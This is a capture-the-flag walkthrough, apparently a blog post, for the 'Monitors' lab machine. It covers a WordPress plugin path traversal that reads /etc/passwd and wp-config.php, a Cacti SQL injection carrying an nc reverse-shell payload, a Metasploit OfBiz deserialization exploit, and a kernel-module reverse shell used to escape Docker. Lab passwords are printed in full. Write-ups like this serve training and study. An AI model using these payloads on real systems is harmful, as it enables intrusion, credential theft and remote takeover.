I")<h1 id="user">User</h1>

<p>The first thing is to use nmap for scan ports :</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sSCV -v -A -p- -Pn 10.10.10.238

Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-24 23:41 CDT
Nmap scan report for 10.10.10.238
Host is up (0.23s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
|_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.76 seconds


</code></pre></div></div>

<p>As always add <code class="language-plaintext highlighter-rouge">monitors.htb</code> to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> and we get the following webpage.</p>

<p><img src="//assets/images/monitor/1.png" alt="" /></p>

<p>It is powered by wordpress so just try <code class="language-plaintext highlighter-rouge">wpscan</code> out</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan --url http://monitors.htb/ -e ap,cb,dbe

....

[+] wp-with-spritz
 | Location: http://monitors.htb/wp-content/plugins/wp-with-spritz/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2015-08-20T20:15:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 4.2.4 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.txt

...

</code></pre></div></div>

<p>It seems that there is a vulnerability - <a href="https://www.exploit-db.com/exploits/44544">https://www.exploit-db.com/exploits/44544</a> :</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd 


root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
Debian-snmp:x:112:115::/var/lib/snmp:/bin/false
mysql:x:109:114:MySQL Server,,,:/nonexistent:/bin/false


</code></pre></div></div>

<p>Try to get wordpress config under <code class="language-plaintext highlighter-rouge">/var/www/wordpress/wp-config.php</code> :</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//var/www/wordpress/wp-config.php

...

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wpadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', 'BestAdministrator@2020!' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );


...

</code></pre></div></div>

<p>Unfortunately the password does not work, try to gather some extra information:</p>

<p><img src="//assets/images/monitor/2.png" alt="" /></p>

<p>a new vhost appeared <code class="language-plaintext highlighter-rouge">cacti.monitors.htb</code>! Add it to the <code class="language-plaintext highlighter-rouge">hosts</code> file and visit the website.</p>

<p>Use the wordpress credentials for login and we are in. The framework is version 1.2.12 â€“&gt; <a href="https://www.exploit-db.com/exploits/49810">https://www.exploit-db.com/exploits/49810</a>. 
I had to do it manually via burp :</p>

<p>Step  1:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/cacti/color.php?action=export&amp;header=false&amp;filter=1')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth%3bupdate+settings+set+value%3d'rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+10.10.14.54+443+&gt;/tmp/f%3b'+where+name%3d'path_php_binary'%3b--+-
</code></pre></div></div>

<p>Step 2:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/cacti/host.php?action=reindex
</code></pre></div></div>

<p>and I obtained a reverse shell as <code class="language-plaintext highlighter-rouge">www-data</code></p>

<p>Enumerating the system I found an interesting service called <code class="language-plaintext highlighter-rouge">cacti-backup.service</code> which points at <code class="language-plaintext highlighter-rouge">/home/marcus/.backup/backup.sh</code>. Just reading the content in order to obtain marcus ssh password!</p>

<p><code class="language-plaintext highlighter-rouge">VerticalEdge2020</code></p>

<h1 id="root">Root</h1>

<p>Running enumeration on the host it is possible to see a new port running locally, <code class="language-plaintext highlighter-rouge">8443</code>.
So we do pivoting through ssh using <code class="language-plaintext highlighter-rouge">ssh -L 8443:localhost:8443 marcus@monitors.htb</code></p>

<p><img src="//assets/images/monitor/3.png" alt="" /></p>

<p>As we see the server runs tomcat version 9.0.31. After some research, I discovered that Tomcat is now part of Apache OfBiz, so I checked some vulnerabilities for also that framework and found <code class="language-plaintext highlighter-rouge">CVE-2020-9496</code>.</p>

<p><code class="language-plaintext highlighter-rouge">use exploit/linux/http/apache_ofbiz_deserialization
set LHOST 10.10.x.x
set RHOSTS 127.0.0.1
set payload linux/x64/shell/reverse_tcp
set forceexploit true
run
</code></p>

<p>and we got shell as root into the docker container (there is <code class="language-plaintext highlighter-rouge">.dockernev</code> ) . So now we need to evade the docker somehow.
Checking the capabilities with linpeas we can notice that we have  <code class="language-plaintext highlighter-rouge">CAP_SYS_MODULE</code> which is really interesting. I followed different articles ( <a href="https://xcellerator.github.io/posts/docker_escape/">https://xcellerator.github.io/posts/docker_escape/</a> , <a href="https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd">https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd</a>) which mainly prove that, due to the fact that the kernel for the container is the same as the host, we can evade the container installing a module which interacts directly with the kernel.</p>

<p>So I just created two files, <code class="language-plaintext highlighter-rouge">Makefile</code> and <code class="language-plaintext highlighter-rouge">reverse.c</code> :</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Makefile

obj-m +=reverse.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean


</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reverse.c

#include &lt;linux/kmod.h&gt;
#include &lt;linux/module.h&gt;
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");
char* argv[] = {"/bin/bash","-c","bash -i &gt;&amp; /dev/tcp/172.17.0.1/4444 0&gt;&amp;1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}
module_init(reverse_shell_init);
module_exit(reverse_shell_exit);

</code></pre></div></div>

<p>After having uploaded them onto the docker container, using <code class="language-plaintext highlighter-rouge">curl -o</code>,  compile them through <code class="language-plaintext highlighter-rouge">make all</code> command (if you encounter compilation problems and errors just run <code class="language-plaintext highlighter-rouge">export PATH=$PATH/usr/lib/gcc/x86_64-linux-gnu/8/</code>) and then open a netcat listener on the host as marcus</p>

<p><code class="language-plaintext highlighter-rouge">nc -lnvp 4444</code></p>

<p>At last run <code class="language-plaintext highlighter-rouge">insmod reverse.ko</code>. And we obtain a reverse shell back as root. Enjoy!</p>
:ET